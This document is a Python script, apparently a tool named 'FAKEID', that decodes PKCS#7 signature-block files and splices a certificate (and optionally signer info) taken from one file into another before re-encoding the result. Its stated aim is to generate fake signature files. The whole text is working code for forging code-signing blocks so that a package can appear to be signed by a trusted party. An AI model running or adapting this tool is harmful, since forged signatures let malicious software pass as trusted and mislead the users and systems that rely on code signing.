#!/usr/bin/python
#
# generate a FAKEID rsa files
# by retme
#
from pyasn1_modules import rfc2315, pem
from pyasn1.codec.der import encoder, decoder
import  sys,base64

def print_rsa(file_name):
        file = open(file_name,"r")
        buffer = file.read()
        buffer_base = base64.b64encode(buffer)
        file.close()
        
        file = open(file_name + ".pem","w")
        file.write('-----BEGIN PKCS7-----\n')
        file.write(buffer_base)
        file.write('\n-----END PKCS7-----\n')
        file.close()
        
        file = open(file_name + ".pem","r")
        
        idx, substrate = pem.readPemBlocksFromFile(
            file, ('-----BEGIN PKCS7-----', '-----END PKCS7-----')
            )
        
        file.close()
        assert substrate, 'bad PKCS7 data on input'
                
        contentInfo, rest = decoder.decode(substrate, asn1Spec=rfc2315.ContentInfo())
        
        if rest: substrate = substrate[:-len(rest)]
        
        #/home/retme/Desktop/xx/SIGN.RSA
        
        #print contentInfo
            #ContentInfo
        print(contentInfo.prettyPrint())
        buf =   contentInfo.getComponentByName('content')

        assert encoder.encode(contentInfo, defMode=False) == substrate or \
               encoder.encode(contentInfo, defMode=True) == substrate, \
               're-encode fails'
        
        contentType = contentInfo.getComponentByName('contentType')
        
        #print contentInfo
        #certificates = contentInfo.getComponentByName('certificates')
        
        #certificates.prettyPrint()
        #print certificates
        contentInfoMap = {
            (1, 2, 840, 113549, 1, 7, 1): rfc2315.Data(),
            (1, 2, 840, 113549, 1, 7, 2): rfc2315.SignedData(),
            (1, 2, 840, 113549, 1, 7, 3): rfc2315.EnvelopedData(),
            (1, 2, 840, 113549, 1, 7, 4): rfc2315.SignedAndEnvelopedData(),
            (1, 2, 840, 113549, 1, 7, 5): rfc2315.DigestedData(),
            (1, 2, 840, 113549, 1, 7, 6): rfc2315.EncryptedData()
            }
        
        content, _ = decoder.decode(
            contentInfo.getComponentByName('content'),
            asn1Spec=contentInfoMap[contentType]
            )
        
        
        #content.getComponentByName('certificates').setComponentByPosition(1)
        #print content.getComponentByName('certificates').getComponentByPosition(0).getComponentByName('certificate').getComponentByName('tbsCertificate').getComponentByName('serialNumber')
        
        
        
        #print content
        print(content.prettyPrint())        
        
def cert_from_content(file_name,cert,cert_idx,sig):        
        file = open(file_name,"r")
        buffer = file.read()
        buffer_base = base64.b64encode(buffer)
        file.close()
        
        file = open(file_name + ".pem","w")
        file.write('-----BEGIN PKCS7-----\n')
        file.write(buffer_base)
        file.write('\n-----END PKCS7-----\n')
        file.close()
        
        file = open(file_name + ".pem","r")
        
        idx, substrate = pem.readPemBlocksFromFile(
            file, ('-----BEGIN PKCS7-----', '-----END PKCS7-----')
            )
        
        file.close()
        assert substrate, 'bad PKCS7 data on input'
                
        contentInfo, rest = decoder.decode(substrate, asn1Spec=rfc2315.ContentInfo())
        
        if rest: substrate = substrate[:-len(rest)]
        
        #/home/retme/Desktop/xx/SIGN.RSA
        
        #print contentInfo
            #ContentInfo
        #print(contentInfo.prettyPrint())
        buf =   contentInfo.getComponentByName('content')

        assert encoder.encode(contentInfo, defMode=False) == substrate or \
               encoder.encode(contentInfo, defMode=True) == substrate, \
               're-encode fails'
        
        contentType = contentInfo.getComponentByName('contentType')
        
        #print contentInfo
        #certificates = contentInfo.getComponentByName('certificates')
        
        #certificates.prettyPrint()
        #print certificates
        contentInfoMap = {
            (1, 2, 840, 113549, 1, 7, 1): rfc2315.Data(),
            (1, 2, 840, 113549, 1, 7, 2): rfc2315.SignedData(),
            (1, 2, 840, 113549, 1, 7, 3): rfc2315.EnvelopedData(),
            (1, 2, 840, 113549, 1, 7, 4): rfc2315.SignedAndEnvelopedData(),
            (1, 2, 840, 113549, 1, 7, 5): rfc2315.DigestedData(),
            (1, 2, 840, 113549, 1, 7, 6): rfc2315.EncryptedData()
            }
        
        content, _ = decoder.decode(
            contentInfo.getComponentByName('content'),
            asn1Spec=contentInfoMap[contentType]
            )
        
        
        #content.getComponentByName('certificates').setComponentByPosition(1)
        content.getComponentByName('certificates').setComponentByPosition(cert_idx,cert)
        if sig != None:
                content.getComponentByName('signerInfos').setComponentByPosition(0,sig)
        
        content_enc =  encoder.encode(content, defMode=True)

        contentInfo.setComponentByName('content',content_enc)
        return encoder.encode(contentInfo, defMode=True)

def get_cert_from_content(file_name,idx):
        file = open(file_name,"r")
        buffer = file.read()
        buffer_base = base64.b64encode(buffer)
        file.close()
        
        file = open(file_name + ".pem","w")
        file.write('-----BEGIN PKCS7-----\n')
        file.write(buffer_base)
        file.write('\n-----END PKCS7-----\n')
        file.close()
        
        file = open(file_name + ".pem","r")
        
        idx, substrate = pem.readPemBlocksFromFile(
            file, ('-----BEGIN PKCS7-----', '-----END PKCS7-----')
            )
        
        file.close()
        assert substrate, 'bad PKCS7 data on input'
                
        contentInfo, rest = decoder.decode(substrate, asn1Spec=rfc2315.ContentInfo())
        
        if rest: substrate = substrate[:-len(rest)]
        
        #/home/retme/Desktop/xx/SIGN.RSA
        
        #print contentInfo
            #ContentInfo
        #print(contentInfo.prettyPrint())
        buf =   contentInfo.getComponentByName('content')

        assert encoder.encode(contentInfo, defMode=False) == substrate or \
               encoder.encode(contentInfo, defMode=True) == substrate, \
               're-encode fails'
        
        contentType = contentInfo.getComponentByName('contentType')
        
        #print contentInfo
        #certificates = contentInfo.getComponentByName('certificates')
        
        #certificates.prettyPrint()
        #print certificates
        contentInfoMap = {
            (1, 2, 840, 113549, 1, 7, 1): rfc2315.Data(),
            (1, 2, 840, 113549, 1, 7, 2): rfc2315.SignedData(),
            (1, 2, 840, 113549, 1, 7, 3): rfc2315.EnvelopedData(),
            (1, 2, 840, 113549, 1, 7, 4): rfc2315.SignedAndEnvelopedData(),
            (1, 2, 840, 113549, 1, 7, 5): rfc2315.DigestedData(),
            (1, 2, 840, 113549, 1, 7, 6): rfc2315.EncryptedData()
            }
        
        content, _ = decoder.decode(
            contentInfo.getComponentByName('content'),
            asn1Spec=contentInfoMap[contentType]
            )
        
        #print content.getComponentByName('signerInfos').getComponentByPosition(0)  
        #content.getComponentByName('certificates').setComponentByPosition(1)
        return [content.getComponentByName('signerInfos').getComponentByPosition(0),\
                content.getComponentByName('certificates').getComponentByPosition(idx)]
        
               
def new_rsa():
        file_name = raw_input("get an rsa  name\n")
        file = open(file_name,"r")
        buffer = file.read()
        buffer_base = base64.b64encode(buffer)
        file.close()
        
        file = open(file_name + ".pem","w")
        file.write('-----BEGIN PKCS7-----\n')
        file.write(buffer_base)
        file.write('\n-----END PKCS7-----\n')
        file.close()
        
        file = open(file_name + ".pem","r")
        
        idx, substrate = pem.readPemBlocksFromFile(
            file, ('-----BEGIN PKCS7-----', '-----END PKCS7-----')
            )
        
        file.close()
        assert substrate, 'bad PKCS7 data on input'
                
        contentInfo, rest = decoder.decode(substrate, asn1Spec=rfc2315.ContentInfo())
        
        if rest: substrate = substrate[:-len(rest)]
        
        #/home/retme/Desktop/xx/SIGN.RSA
        
        #print contentInfo
            #ContentInfo
        #print(contentInfo.prettyPrint())
        buf =   contentInfo.getComponentByName('content')
        
        f = open("./decode.rsa","w")
        f.write(str(buf))
        f.close()
        
        file = open("./encode.rsa","r")
        buffer = file.read()
        file.close()
        
        contentInfo.setComponentByName('content',buffer)
        
        ret = encoder.encode(contentInfo, defMode=True)
        
        file = open("./final.rsa","w")
        file.write(str(ret));
        file.close()
        
        print_rsa("./final.rsa")
        #print ret
if __name__ == "__main__" :
        #print_rsa("/home/retme/Desktop/CERT.RSA")
        sig,cert = get_cert_from_content("/home/retme/Desktop/CERT.RSA",0)
        
        #buff = cert_from_content("/home/retme/Desktop/SIGN.RSA",cert,1,sig)
        buff = cert_from_content("/home/retme/Desktop/SIGN.RSA",cert,1,None)
        
        file = open("./final.rsa","w")
        file.write(str(buff));
        file.close()
        print_rsa("./final.rsa")
